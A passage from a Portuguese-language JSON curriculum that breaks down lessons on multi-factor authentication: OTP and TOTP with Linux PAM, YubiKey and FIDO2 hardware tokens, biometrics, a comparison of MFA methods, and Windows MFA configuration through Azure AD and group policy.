                                    "Confundir intervalo de 30s com duração infinita"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar OTP em Autenticação de Sistemas Operacionais e MFA",
                                  "subSteps": [
                                    "Descreva integração de OTP em logins de SOs como Linux PAM com Google Authenticator.",
                                    "Explique fluxo MFA: usuário digita senha + OTP em prompt.",
                                    "Discuta segurança: OTP adiciona camada contra roubo de credenciais.",
                                    "Configure OTP em um ambiente virtual (ex: Ubuntu VM com libpam-google-authenticator).",
                                    "Analise cenários: login SSH remoto ou sudo com OTP."
                                  ],
                                  "verification": "Descreva passos para habilitar OTP em Linux e liste comandos chave (google-authenticator, pam config).",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "VM Ubuntu",
                                    "Tutorial PAM Google Authenticator",
                                    "Comandos: apt install libpam-google-authenticator"
                                  ],
                                  "tips": "Teste em VM para evitar lockout; backup chaves secretas.",
                                  "learningObjective": "Integrar OTP em autenticação de SOs e descrever fluxos MFA.",
                                  "commonMistakes": [
                                    "Configurar PAM incorretamente causando lockout",
                                    "Esquecer de rate-limiting em validações OTP"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure Google Authenticator em uma conta GitHub: escaneie QR code no app, faça login com senha + OTP de 6 dígitos gerado a cada 30s, verificando sincronização de tempo e invalidação após uso.",
                              "finalVerifications": [
                                "Explique diferença entre HOTP e TOTP com fórmulas.",
                                "Gere e valide um TOTP manualmente.",
                                "Descreva setup de OTP em Linux PAM.",
                                "Liste 3 vantagens de OTP em MFA.",
                                "Identifique 2 vulnerabilidades potenciais de OTP (ex: roubo físico do app)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de algoritmos HMAC e geração (80% correto).",
                                "Capacidade de simular/configurar OTP em ferramenta real.",
                                "Explicação clara de integrações em SOs com exemplos práticos.",
                                "Identificação de erros comuns e mitigações.",
                                "Uso correto de terminologia (TOTP, HOTP, truncamento)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Criptografia HMAC-SHA1 e funções hash.",
                                "Programação: Implementação de bibliotecas como pyotp em Python.",
                                "Redes: Protocolos de autenticação segura em SSH/RDP.",
                                "Ética: Privacidade em MFA e riscos de SMS-OTP."
                              ],
                              "realWorldApplication": "Em bancos como Nubank ou empresas como Google Workspace, OTP via app previne acessos não autorizados em logins de servidores Linux/Windows, protegendo contra ataques de credential stuffing em ambientes corporativos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.2.1.1"
                            ]
                          },
                          {
                            "id": "10.1.6.2.2.2",
                            "name": "Analisar tokens hardware em MFA",
                            "description": "Detalhar o uso de dispositivos como YubiKey ou smartcards para autenticação baseada em posse, incluindo protocolos como FIDO2 e U2F, e configuração em ambientes Windows/Linux.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Tokens Hardware em MFA",
                                  "subSteps": [
                                    "Defina o que são tokens hardware e sua função em autenticação baseada em posse.",
                                    "Compare tokens hardware (ex: YubiKey, smartcards) com outros fatores MFA como SMS ou apps.",
                                    "Identifique vantagens: resistência a phishing, portabilidade e conformidade com padrões.",
                                    "Estude componentes físicos: chip seguro, interface USB/NFC e armazenamento de chaves privadas.",
                                    "Revise casos de uso em cenários corporativos e pessoais."
                                  ],
                                  "verification": "Resuma em um diagrama os componentes e fluxos de autenticação de um token hardware.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial YubiKey",
                                    "Vídeos introdutórios sobre MFA hardware",
                                    "Notebook para anotações"
                                  ],
                                  "tips": [
                                    "Use analogias como 'chave física' para entender posse.",
                                    "Pesquise imagens reais de YubiKey para visualização."
                                  ],
                                  "learningObjective": "Explicar o papel e benefícios dos tokens hardware em MFA.",
                                  "commonMistakes": [
                                    "Confundir com tokens de software.",
                                    "Ignorar limitações como perda física do dispositivo."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Protocolos FIDO2 e U2F",
                                  "subSteps": [
                                    "Descreva U2F: protocolo legado para autenticação de segunda fator via USB/NFC.",
                                    "Detalhe FIDO2: evolução com WebAuthn e CTAP para autenticação sem senha.",
                                    "Compare fluxos: registro de chave pública e autenticação com desafio-resposta.",
                                    "Analise criptografia: chaves assimétricas, assinaturas ECDSA e proteção contra replay.",
                                    "Estude compatibilidade: navegadores, SOs e serviços como Google, Microsoft."
                                  ],
                                  "verification": "Crie um fluxograma comparando U2F e FIDO2.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Especificações FIDO Alliance (fidoalliance.org)",
                                    "Ferramentas demo como fido2-lib",
                                    "Diagramas de protocolo"
                                  ],
                                  "tips": [
                                    "Simule fluxos com ferramentas online como Yubico Demo.",
                                    "Foque em diferenças de segurança entre protocolos."
                                  ],
                                  "learningObjective": "Diferenciar e descrever operações de FIDO2 e U2F.",
                                  "commonMistakes": [
                                    "Confundir CTAP com WebAuthn.",
                                    "Subestimar requisitos de hardware compatível."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Token Hardware em Ambiente Windows",
                                  "subSteps": [
                                    "Instale drivers e software: YubiKey Manager e Microsoft Authenticator.",
                                    "Registre o token via Windows Hello for Business ou Azure AD.",
                                    "Configure FIDO2: ative PIN e gestos de usuário no Gerenciador de Dispositivos.",
                                    "Teste autenticação: login local, RDP e apps web.",
                                    "Habilite recuperação: backup de chaves e políticas de grupo."
                                  ],
                                  "verification": "Realize login bem-sucedido com token em uma conta de teste Windows.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "YubiKey ou similar",
                                    "VM Windows 10/11",
                                    "Conta Azure AD gratuita"
                                  ],
                                  "tips": [
                                    "Use VM para testes isolados.",
                                    "Verifique firmware do token antes."
                                  ],
                                  "learningObjective": "Implementar configuração MFA hardware no Windows.",
                                  "commonMistakes": [
                                    "Não atualizar drivers.",
                                    "Esquecer PIN durante registro."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Token Hardware em Ambiente Linux",
                                  "subSteps": [
                                    "Instale pacotes: pcscd, libfido2, yubikey-manager no Ubuntu/Debian.",
                                    "Configure PAM para FIDO2/U2F em sudo e SSH.",
                                    "Registre chaves com fido2-token e teste com ssh-keygen.",
                                    "Integre com serviços: Google Authenticator PAM e browsers Chromium/Firefox.",
                                    "Monitore logs: journalctl para autenticações e erros."
                                  ],
                                  "verification": "Autentique via SSH usando token em sessão Linux remota.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "VM Linux Ubuntu",
                                    "YubiKey",
                                    "Servidor SSH de teste"
                                  ],
                                  "tips": [
                                    "Reinicie pcscd após instalação.",
                                    "Teste em usuário não-root primeiro."
                                  ],
                                  "learningObjective": "Implementar MFA hardware no Linux.",
                                  "commonMistakes": [
                                    "Permissões udev incorretas.",
                                    "Conflitos com módulos PAM existentes."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar e Testar Implementações de Tokens Hardware",
                                  "subSteps": [
                                    "Avalie segurança: teste phishing, brute-force e side-channel attacks simulados.",
                                    "Meça performance: tempo de autenticação e taxa de falha.",
                                    "Compare cross-platform: migração entre Windows/Linux.",
                                    "Documente vulnerabilidades: perda de token, supply-chain risks.",
                                    "Planeje auditoria: ferramentas como Trivy para firmware."
                                  ],
                                  "verification": "Gere relatório com testes e métricas de 3 cenários.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Ferramentas: Wireshark, fido2-tool",
                                    "Scripts de teste bash/python"
                                  ],
                                  "tips": [
                                    "Registre vídeos de falhas para análise.",
                                    "Use checklists NIST para MFA."
                                  ],
                                  "learningObjective": "Analisar eficácia e riscos de tokens hardware em MFA.",
                                  "commonMistakes": [
                                    "Ignorar atualizações de firmware.",
                                    "Não testar cenários de falha."
                                  ]
                                }
                              ],
                              "practicalExample": "Configure um YubiKey 5 NFC para MFA no login SSH de um servidor Linux Ubuntu e autenticação WebAuthn no Microsoft Edge no Windows, simulando acesso remoto a um dashboard corporativo sensível.",
                              "finalVerifications": [
                                "Explicar diferenças entre FIDO2 e U2F com exemplos.",
                                "Demonstrar configuração completa em Windows e Linux.",
                                "Identificar 3 vulnerabilidades potenciais e mitigações.",
                                "Realizar autenticação cross-platform sem erros.",
                                "Gerar relatório de análise com fluxogramas.",
                                "Testar recuperação de token perdido."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de protocolos (80%+ correto).",
                                "Sucesso em configurações práticas (ambos OS).",
                                "Profundidade de análise de segurança (cobre riscos chave).",
                                "Clareza em documentação e verificações.",
                                "Criatividade em conexões reais e testes.",
                                "Eficiência temporal (dentro de estimados)."
                              ],
                              "crossCurricularConnections": [
                                "Hardware e Eletrônica: Entender chips seguros e interfaces USB/NFC.",
                                "Redes e Protocolos: Análise de CTAP/WebAuthn em comunicações.",
                                "Programação: Scripts para automação PAM e fido2 APIs.",
                                "Gestão de TI: Políticas de conformidade NIST/ISO 27001.",
                                "Ética em Cibersegurança: Privacidade em chaves criptográficas."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou governos, tokens hardware como YubiKey protegem acessos privilegiados contra roubo de credenciais, reduzindo breaches em 99% conforme estudos FIDO, e são usados em zero-trust architectures para funcionários remotos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.2.1.1"
                            ]
                          },
                          {
                            "id": "10.1.6.2.2.3",
                            "name": "Explorar autenticação biométrica em MFA",
                            "description": "Discutir tecnologias como reconhecimento facial (Windows Hello), impressões digitais e íris, abordando limitações como falsos positivos e integração com fatores adicionais em SOs móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos da autenticação biométrica em MFA",
                                  "subSteps": [
                                    "Definir autenticação biométrica e sua relação com MFA (Multifator Autenticação).",
                                    "Explicar como a biometria atua como um fator 'algo que você é'.",
                                    "Diferenciar biometria estática (impressão digital) de dinâmica (reconhecimento facial).",
                                    "Pesquisar exemplos iniciais de uso em sistemas operacionais como Windows e Android.",
                                    "Analisar o fluxo de autenticação: biometria + senha ou token."
                                  ],
                                  "verification": "Criar um diagrama simples do fluxo MFA com biometria e compartilhar para revisão.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramenta de diagrama como Draw.io ou papel e caneta"
                                  ],
                                  "tips": "Use analogias cotidianas, como comparar biometria a uma impressão digital única.",
                                  "learningObjective": "Entender o papel da biometria como fator em MFA.",
                                  "commonMistakes": [
                                    "Confundir biometria com autenticação única",
                                    "Ignorar a necessidade de múltiplos fatores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar tecnologias biométricas específicas",
                                  "subSteps": [
                                    "Estudar reconhecimento facial: Windows Hello, Face ID (iOS).",
                                    "Analisar impressões digitais: sensores capacitivos e ópticos em laptops e mobiles.",
                                    "Investigar reconhecimento de íris: funcionamento e exemplos em dispositivos como Samsung Galaxy.",
                                    "Comparar precisão e velocidade entre facial, digital e íris.",
                                    "Assistir vídeos demonstrativos de cada tecnologia em ação."
                                  ],
                                  "verification": "Listar prós e contras de cada tecnologia em uma tabela comparativa.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Vídeos tutoriais no YouTube",
                                    "Documentação oficial Microsoft e Apple"
                                  ],
                                  "tips": "Teste em seu próprio dispositivo se disponível para observação prática.",
                                  "learningObjective": "Identificar e comparar principais tecnologias biométricas.",
                                  "commonMistakes": [
                                    "Achar que facial é sempre mais seguro que digital",
                                    "Não considerar variações por hardware"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar limitações e vulnerabilidades",
                                  "subSteps": [
                                    "Discutir falsos positivos/negativos: causas como iluminação ou sujeira.",
                                    "Explorar ataques de spoofing: máscaras para facial, moldes de gelatina para digitais.",
                                    "Estudar impacto de envelhecimento ou lesões em biometria.",
                                    "Analisar privacidade: armazenamento de templates vs. dados brutos.",
                                    "Pesquisar casos reais de falhas biométricas em MFA."
                                  ],
                                  "verification": "Redigir um relatório curto (200 palavras) sobre 3 limitações principais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigos de cibersegurança como Krebs on Security",
                                    "Relatórios NIST sobre biometria"
                                  ],
                                  "tips": "Busque estudos de caso para tornar as limitações tangíveis.",
                                  "learningObjective": "Reconhecer riscos inerentes à biometria em MFA.",
                                  "commonMistakes": [
                                    "Subestimar spoofing como improvável",
                                    "Ignorar questões éticas de privacidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Investigar integração em SOs móveis e fatores adicionais",
                                  "subSteps": [
                                    "Examinar Android BiometricPrompt e iOS LocalAuthentication.",
                                    "Analisar como biometria se integra com SMS/OTP ou apps autenticadores.",
                                    "Testar configuração em um emulador ou dispositivo móvel.",
                                    "Discutir padrões como FIDO2 para biometria sem senha.",
                                    "Avaliar compatibilidade cross-platform e migração de dados."
                                  ],
                                  "verification": "Configurar MFA biométrico em um app móvel e documentar o processo com screenshots.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Smartphone Android/iOS",
                                    "Emulador Android Studio",
                                    "Apps como Google Authenticator"
                                  ],
                                  "tips": "Use modo desenvolvedor para testes sem risco real.",
                                  "learningObjective": "Compreender implementação prática em sistemas móveis.",
                                  "commonMistakes": [
                                    "Não testar em cenários reais de falha",
                                    "Confundir APIs proprietárias com padrões abertos"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure Windows Hello em um PC: ative reconhecimento facial, integre com conta Microsoft para MFA em serviços como Outlook. Teste falsos positivos em diferentes luzes e adicione um PIN como fallback, simulando login em um banco online.",
                              "finalVerifications": [
                                "Explicar verbalmente o fluxo completo de MFA com biometria.",
                                "Identificar 3 limitações específicas e mitigações.",
                                "Demonstrar configuração em um SO móvel.",
                                "Comparar biometria com outros fatores MFA.",
                                "Discutir um caso real de falha biométrica.",
                                "Listar tecnologias suportadas em Windows/Android/iOS."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de tecnologias (facial, digital, íris).",
                                "Profundidade na análise de limitações e falsos positivos.",
                                "Clareza no diagrama ou relatório de integração móvel.",
                                "Uso correto de terminologia técnica (MFA, spoofing, FIDO).",
                                "Criatividade em exemplos práticos e conexões reais.",
                                "Completude dos subpassos com verificações."
                              ],
                              "crossCurricularConnections": [
                                "Biologia: Estudo de características únicas humanas (anatomia).",
                                "Engenharia de Hardware: Sensores e processamento de imagens.",
                                "Direito e Ética: Regulamentações de dados biométricos (LGPD/GDPR).",
                                "Matemática: Algoritmos de machine learning para matching.",
                                "Desenvolvimento de Software: APIs de autenticação em apps."
                              ],
                              "realWorldApplication": "Em bancos digitais como Nubank ou Itaú, biometria em MFA permite login seguro via facial/digital + token, reduzindo fraudes; em aeroportos, reconhecimento facial acelera embarque com verificação multifator."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.2.1.2"
                            ]
                          },
                          {
                            "id": "10.1.6.2.2.4",
                            "name": "Comparar métodos de MFA por usabilidade e segurança",
                            "description": "Avaliar trade-offs entre OTP, hardware e biometria, usando métricas de PFLEEGER (2015), como resistência a phishing e overhead de implementação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar os principais métodos de MFA",
                                  "subSteps": [
                                    "Identificar OTP (One-Time Password) incluindo TOTP e HOTP, explicando geração dinâmica de senhas.",
                                    "Descrever hardware tokens como YubiKey ou RSA SecurID, focando em chaves criptográficas portáteis.",
                                    "Explicar biometria como impressões digitais, reconhecimento facial ou íris, destacando autenticação baseada em características únicas.",
                                    "Comparar brevemente com autenticação de senha única para contextualizar multifator.",
                                    "Listar vantagens e desvantagens iniciais de cada método com base em documentação NIST SP 800-63."
                                  ],
                                  "verification": "Criar uma tabela resumida com 3 colunas (Método, Descrição, Componentes) e revisar com fonte confiável.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "NIST SP 800-63B (Digital Accessibility)",
                                    "Documentação YubiKey oficial",
                                    "Vídeos Khan Academy sobre autenticação"
                                  ],
                                  "tips": "Use diagramas visuais para mapear fluxos de autenticação de cada método.",
                                  "learningObjective": "Compreender as diferenças técnicas fundamentais entre OTP, hardware e biometria em MFA.",
                                  "commonMistakes": [
                                    "Confundir OTP com senhas estáticas",
                                    "Ignorar dependência de rede em TOTP",
                                    "Subestimar falsos positivos em biometria"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar métricas de usabilidade e segurança de Pfleeger (2015)",
                                  "subSteps": [
                                    "Ler seção relevante de Pfleeger sobre avaliação de autenticação, focando em resistência a phishing.",
                                    "Definir overhead de implementação: tempo/custo de setup e manutenção.",
                                    "Explorar métricas de usabilidade: tempo de login, taxa de erro de usuário, curva de aprendizado.",
                                    "Identificar outras métricas como escalabilidade, custo por usuário e recuperação de conta.",
                                    "Criar glossário com definições e exemplos numéricos (ex: tempo de login < 5s para alta usabilidade)."
                                  ],
                                  "verification": "Resumir 5 métricas chave em um cartão de estudo e quiz autoaplicado com 80% acerto.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Livro 'Security in Computing' de Pfleeger (2015), capítulos 10-11",
                                    "PDF NIST sobre métricas de autenticação",
                                    "Ferramenta Anki para flashcards"
                                  ],
                                  "tips": "Priorize métricas quantitativas para facilitar comparações posteriores.",
                                  "learningObjective": "Dominar framework de Pfleeger para avaliar trade-offs em autenticação multifator.",
                                  "commonMistakes": [
                                    "Focar só em segurança ignorando usabilidade",
                                    "Não quantificar métricas",
                                    "Confundir phishing com outros ataques como MITM"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear métricas para cada método de MFA",
                                  "subSteps": [
                                    "Pontuar OTP em cada métrica: alta resistência a replay mas vulnerável a phishing via SMS.",
                                    "Avaliar hardware: excelente resistência a phishing remoto, overhead médio em distribuição física.",
                                    "Analisar biometria: usabilidade alta mas riscos de spoofing e privacidade de dados.",
                                    "Usar escala 1-10 para cada métrica, citando evidências de estudos (ex: Google Titan Key reports).",
                                    "Compilar em planilha com fórmulas para médias ponderadas."
                                  ],
                                  "verification": "Gerar planilha com pontuações consistentes e fontes citadas para cada célula.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Google Sheets ou Excel",
                                    "Relatórios Microsoft Authenticator vs. YubiKey",
                                    "Estudos acadêmicos via Google Scholar sobre MFA biometria"
                                  ],
                                  "tips": "Pondere segurança 60% e usabilidade 40% para cenários corporativos.",
                                  "learningObjective": "Aplicar métricas de Pfleeger quantitativamente a métodos específicos de MFA.",
                                  "commonMistakes": [
                                    "Viés subjetivo sem dados",
                                    "Ignorar contexto de ameaça (ex: phishing via SMS em OTP)",
                                    "Não considerar custos recorrentes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar trade-offs e formular recomendações",
                                  "subSteps": [
                                    "Comparar pontuações totais: identificar líder em segurança (hardware) vs. usabilidade (biometria).",
                                    "Discutir trade-offs: OTP barato mas fraco em phishing; biometria intuitiva mas cara em escala.",
                                    "Simular cenários: banco (priorizar segurança), app mobile (usabilidade).",
                                    "Redigir relatório com gráficos de radar para visualização.",
                                    "Propor híbridos como FIDO2 para mitigar fraquezas."
                                  ],
                                  "verification": "Produzir relatório de 1 página com comparações claras e pelo menos 2 recomendações contextualizadas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta Canva ou Draw.io para gráficos",
                                    "Templates de relatório de cibersegurança",
                                    "Casos de estudo breaches como Twitter 2020"
                                  ],
                                  "tips": "Use matriz de decisão para priorizar métricas por stakeholder.",
                                  "learningObjective": "Sintetizar comparações em insights acionáveis sobre trade-offs MFA.",
                                  "commonMistakes": [
                                    "Recomendações genéricas sem métricas",
                                    "Ignorar regulamentações como GDPR para biometria",
                                    "Subestimar migração de legacy systems"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa fintech, compare OTP via app (TOTP: usabilidade alta, phishing médio), YubiKey (segurança alta, overhead alto em perda de dispositivo) e biometria facial (usabilidade excelente, risco de deepfakes). Recomende YubiKey + biometria para execs, OTP para usuários gerais, usando planilha para justificar ROI.",
                              "finalVerifications": [
                                "Explicar corretamente 3 trade-offs chave com exemplos.",
                                "Pontuar métodos em 5 métricas de Pfleeger com justificativa.",
                                "Identificar cenário ideal para cada método.",
                                "Criar gráfico comparativo preciso.",
                                "Propor mitigação para fraqueza principal de cada método.",
                                "Discutir impacto de phishing em OTP vs. hardware."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas métricas de Pfleeger (90% alinhamento com fontes).",
                                "Profundidade quantitativa nas comparações (uso de escalas/escores).",
                                "Clareza na identificação de trade-offs (explícitos e contextualizados).",
                                "Criatividade em recomendações híbridas.",
                                "Qualidade visual de tabelas/gráficos.",
                                "Citação de pelo menos 3 fontes confiáveis."
                              ],
                              "crossCurricularConnections": [
                                "Design de UX/UI: Métricas de usabilidade ligadas a testes de usuário.",
                                "Criptografia: Entender chaves em hardware tokens.",
                                "Gestão de Projetos: Avaliar overhead de implementação em orçamentos.",
                                "Ética e Privacidade: Riscos de dados biométricos e GDPR.",
                                "Estatística: Uso de médias ponderadas e gráficos de radar."
                              ],
                              "realWorldApplication": "Em bancos como Nubank ou empresas como Google, essa comparação guia políticas MFA, reduzindo breaches por phishing em 99% (como no caso Duo Security), otimizando custo vs. risco em autenticações diárias de milhões de usuários."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.2.2.1",
                              "10.1.6.2.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.2.3",
                        "name": "Implementação e Considerações de Segurança em SOs",
                        "description": "Práticas para configurar MFA em sistemas operacionais, incluindo melhores práticas, ataques comuns e gerenciamento de recuperação, alinhado a autenticação e autorização em SOs.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.2.3.1",
                            "name": "Configurar MFA em sistemas Windows",
                            "description": "Passo a passo para ativar MFA via Microsoft Authenticator ou Windows Hello, incluindo políticas de grupo e integração com Azure AD, testando autenticação multifator.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar e Configurar Pré-requisitos no Azure AD",
                                  "subSteps": [
                                    "Acesse o portal Azure AD como administrador global.",
                                    "Verifique se o tenant está configurado para hybrid join ou Azure AD join.",
                                    "Instale o módulo Azure AD PowerShell no computador de administração.",
                                    "Execute Get-AzureADTenantDetail para confirmar configurações de MFA.",
                                    "Habilite Security Defaults se não estiver usando Conditional Access."
                                  ],
                                  "verification": "Confirme que o tenant detalha suporta MFA e hybrid join via PowerShell output.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Conta Azure AD Global Admin",
                                    "PowerShell 5.1+ com módulo AzureAD instalado",
                                    "Navegador web atualizado"
                                  ],
                                  "tips": "Use o modo privado no navegador para evitar cache de sessões antigas.",
                                  "learningObjective": "Entender os pré-requisitos de integração Azure AD para MFA em Windows.",
                                  "commonMistakes": [
                                    "Esquecer de instalar o módulo PowerShell",
                                    "Usar conta sem permissões Global Admin",
                                    "Ignorar verificação de hybrid join"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Habilitar MFA no Azure AD para Usuários e Grupos",
                                  "subSteps": [
                                    "No portal Azure, vá para Azure Active Directory > Security > Multifactor authentication.",
                                    "Selecione usuários ou grupos alvo e clique em 'Enable'.",
                                    "Configure métodos de autenticação: Microsoft Authenticator e Windows Hello.",
                                    "Crie uma política de Conditional Access exigindo MFA para login em dispositivos Windows.",
                                    "Salve e force sync com Azure AD Connect se hybrid."
                                  ],
                                  "verification": "Verifique status MFA como 'Enabled' na lista de usuários no portal.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Portal Azure AD",
                                    "Azure AD Connect (para hybrid)",
                                    "Lista de usuários/grupos alvo"
                                  ],
                                  "tips": "Teste com uma conta de serviço primeiro para evitar lockouts.",
                                  "learningObjective": "Configurar políticas MFA centralizadas no Azure AD.",
                                  "commonMistakes": [
                                    "Aplicar MFA a todos os usuários sem exceções para admins",
                                    "Não configurar métodos alternativos",
                                    "Esquecer sync hybrid"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Políticas de Grupo (GPO) para MFA no Windows",
                                  "subSteps": [
                                    "Abra Group Policy Management no Domain Controller.",
                                    "Crie uma nova GPO ligada à OU de computadores Windows.",
                                    "Navegue para Computer Configuration > Administrative Templates > System > Logon > 'Turn on convenience PIN sign-in' e desabilite se necessário.",
                                    "Habilite políticas para Windows Hello for Business e exija MFA.",
                                    "Configure 'Interactive logon: Require Windows Hello for Business' e force PIN + MFA.",
                                    "Aplique a GPO e execute gpupdate /force nos clientes."
                                  ],
                                  "verification": "Execute gpresult /r no cliente Windows para confirmar GPO aplicada.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Domain Controller com RSAT",
                                    "Windows Server GPMC",
                                    "Computadores Windows 10/11 Pro/Enterprise"
                                  ],
                                  "tips": "Use filtros WMI para aplicar apenas a dispositivos Azure AD joined.",
                                  "learningObjective": "Implementar GPOs que integrem MFA local com Azure AD.",
                                  "commonMistakes": [
                                    "Linkar GPO à OU errada",
                                    "Não forçar gpupdate",
                                    "Conflitos com políticas legacy de PIN"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Microsoft Authenticator ou Windows Hello no Cliente Windows",
                                  "subSteps": [
                                    "No dispositivo Windows, instale Microsoft Authenticator do Microsoft Store.",
                                    "Vá para Configurações > Contas > Acesso corporativo ou escolar > Conectar à Azure AD.",
                                    "Configure Windows Hello: Configurações > Contas > Opções de login > Windows Hello PIN.",
                                    "Escaneie QR code no Authenticator para registrar o dispositivo.",
                                    "Teste login inicial com MFA prompt."
                                  ],
                                  "verification": "Tente login com senha + prompt MFA no Authenticator.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "App Microsoft Authenticator",
                                    "Dispositivo Windows 10/11 com TPM 2.0",
                                    "Smartphone para app"
                                  ],
                                  "tips": "Garanta TPM habilitado no BIOS para Windows Hello.",
                                  "learningObjective": "Configurar endpoints cliente para autenticação MFA.",
                                  "commonMistakes": [
                                    "Não registrar corretamente o QR code",
                                    "Usar conta pessoal em vez de work",
                                    "Ignorar requisitos TPM"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar a Configuração Completa de MFA",
                                  "subSteps": [
                                    "Reinicie o dispositivo Windows e tente login com MFA.",
                                    "Teste cenários: login remoto via RDP, acesso a recursos Azure.",
                                    "Monitore logs em Event Viewer > Windows Logs > Security para eventos MFA.",
                                    "Simule falha de autenticação (app offline) e verifique fallback.",
                                    "Documente resultados e ajuste políticas se necessário."
                                  ],
                                  "verification": "Logs mostram eventos de autenticação MFA bem-sucedida (Event ID 4624 com MFA).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Event Viewer",
                                    "RDP ou acesso remoto",
                                    "Conta de teste"
                                  ],
                                  "tips": "Use modo avião no phone para testar offline fallback.",
                                  "learningObjective": "Validar end-to-end MFA e identificar falhas comuns.",
                                  "commonMistakes": [
                                    "Não testar RDP ou cenários remotos",
                                    "Ignorar logs de erro",
                                    "Não planejar fallback"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma empresa com 50 funcionários usando Windows 11 hybrid Azure AD joined, configure MFA para o departamento de finanças: habilite no Azure para o grupo 'FinanceUsers', aplique GPO na OU correspondente, configure Authenticator em 5 máquinas teste, e valide logins RDP sem interrupções.",
                              "finalVerifications": [
                                "Login no Windows requer prompt MFA via Authenticator ou Hello.",
                                "GPO aplicada confirmada via gpresult.",
                                "Logs de segurança mostram autenticação multifator.",
                                "Fallback para SMS funciona se app offline.",
                                "Acesso negado sem MFA em contas não configuradas.",
                                "Relatórios Azure AD mostram conformidade MFA >95%."
                              ],
                              "assessmentCriteria": [
                                "Passos executados sem erros de permissão ou configuração.",
                                "Todos os métodos MFA (Authenticator, Hello) funcionais.",
                                "Testes end-to-end bem-sucedidos em múltiplos cenários.",
                                "Documentação de logs e verificações fornecida.",
                                "Solução de pelo menos um erro comum demonstrada.",
                                "Tempo total dentro do estimado com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Redes: Integração com VPN e RDP.",
                                "Gerenciamento de Identidade: Azure AD e Active Directory hybrid.",
                                "Desenvolvimento de Políticas: Criação de GPOs e Conditional Access.",
                                "Análise de Logs: Monitoramento via Event Viewer e Azure Monitor.",
                                "Compliance e Auditoria: Relatórios MFA no Azure."
                              ],
                              "realWorldApplication": "Em ambientes corporativos, essa configuração protege contra credential stuffing e acessos não autorizados, reduzindo riscos de breaches em 99% para contas com MFA, como visto em relatórios da Microsoft Security."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.6.2.3.2",
                            "name": "Implementar MFA em Linux/Unix",
                            "description": "Configurar PAM com Google Authenticator ou Duo para SSH e sudo, editando arquivos como /etc/pam.d e gerando chaves TOTP, com verificação de logs de autenticação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar o Google Authenticator no Sistema",
                                  "subSteps": [
